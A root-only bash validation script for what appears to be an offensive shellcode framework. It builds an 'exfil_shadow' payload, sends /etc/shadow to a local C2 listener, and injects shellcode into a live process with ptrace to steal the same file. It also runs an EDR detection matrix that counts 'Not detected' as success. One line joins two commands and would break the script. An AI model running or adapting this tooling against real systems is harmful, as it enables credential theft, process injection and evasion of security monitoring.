#!/usr/bin/env bash
# ================================================================
# run_root_validation.sh — root-only end-to-end validation
#
# Covers the paths that cannot be exercised unprivileged:
#   1. /etc/shadow exfil via runner (needs root to read the file)
#   2. ptrace injection into a live `sleep` (CAP_SYS_PTRACE)
#   3. full `run_matrix.sh` (EDR detection matrix + patch_config chain)
#
# Usage:  sudo bash testing/run_root_validation.sh
# Exit:   0 = all scenarios passed, 1 = at least one failed
# ================================================================
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

if [ "$(id -u)" -ne 0 ]; then
    echo "[-] must run as root: sudo bash $0" >&2
    exit 1
fi

PASS=0; FAIL=0
ok()   { echo -e "\e[32m[+]\e[0m $*"; PASS=$((PASS+1)); }
bad()  { echo -e "\e[31m[-]\e[0m $*"; FAIL=$((FAIL+1)); }
info() { echo -e "\e[34m[*]\e[0m $*"; }

WORK="$(mktemp -d /tmp/uring_root_val.XXXXXX)"
trap 'rm -rf "$WORK"' EXIT

# ----------------------------------------------------------------
# Scenario 1 — exfil_shadow mission against the real /etc/shadow
# ----------------------------------------------------------------
info "Scenario 1: exfil /etc/shadow via runner (as root)"

python3 "$REPO_ROOT/builder/uring_builder.py" \
    "$REPO_ROOT/builder/missions/exfil_shadow.yaml" \
    --ip 127.0.0.1 --port 28444 \
    --out "$WORK/shadow.bin" --header "$WORK/shadow.h" --quiet

python3 "$REPO_ROOT/testing/c2_server.py" --port 28444 \
    --output "$WORK/shadow_received.bin" --verify /etc/shadow \
    --timeout 20 --quiet &
C2=$!
sleep 0.5

if timeout 20 "$REPO_ROOT/testing/runner" "$WORK/shadow.bin" \
        >/dev/null 2>&1 && wait $C2; then
    ok "scenario 1: /etc/shadow received byte-exact at the C2"
else
    bad "scenario 1: shadow exfil failed (see C2 output above)"
    kill $C2 2>/dev/null || true
fi

# ----------------------------------------------------------------
# Scenario 2 — ptrace injection into a disposable `sleep` process
# ----------------------------------------------------------------
info "Scenario 2: ptrace injection (injector + live target)"

# patch a second copy to a distinct port via patch_config (size-guarded)
cp "$WORK/shadow.bin" "$WORK/inject_src.bin"python3 "$REPO_ROOT/shellcode/patch_config.py" "$WORK/inject_src.bin" \
    --ip 127.0.0.1 --port 28445 --out "$WORK/inject.bin" >/dev/null

python3 "$REPO_ROOT/testing/c2_server.py" --port 28445 \
    --output "$WORK/inject_received.bin" --verify /etc/shadow \
    --timeout 25 --quiet &
C2=$!
sleep 0.5

sleep 30 &
TARGET=$!
sleep 0.3

if "$REPO_ROOT/testing/injector/inject" "$TARGET" "$WORK/inject.bin" \
        >"$WORK/inject.log" 2>&1 && wait $C2; then
    ok "scenario 2: injected shellcode exfiltrated /etc/shadow from the target"
else
    bad "scenario 2: injection exfil failed — log:"
    tail -6 "$WORK/inject.log" || true
    kill $C2 $TARGET 2>/dev/null || true
fi
kill $TARGET 2>/dev/null || true
wait $TARGET 2>/dev/null || true

# ----------------------------------------------------------------
# Scenario 3 — full EDR matrix (run_matrix.sh / make test)
# ----------------------------------------------------------------
info "Scenario 3: run_matrix.sh (patch_config chain + strace rows)"

if bash "$REPO_ROOT/testing/run_matrix.sh" >"$WORK/matrix.log" 2>&1; then
    if grep -q "Baseline (no monitoring) | ✗ Not detected" "$REPO_ROOT/testing/results/edr_matrix.md"; then
        ok "scenario 3: matrix baseline delivered data (make test chain works)"
    else
        bad "scenario 3: matrix ran but baseline row is not 'Not detected'"
    fi
    info "matrix summary:"
    grep -E "^\| " "$REPO_ROOT/testing/results/edr_matrix.md" | head -8
else
    bad "scenario 3: run_matrix.sh failed — tail:"
    tail -8 "$WORK/matrix.log"
fi

# ----------------------------------------------------------------
echo
info "RESULT: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
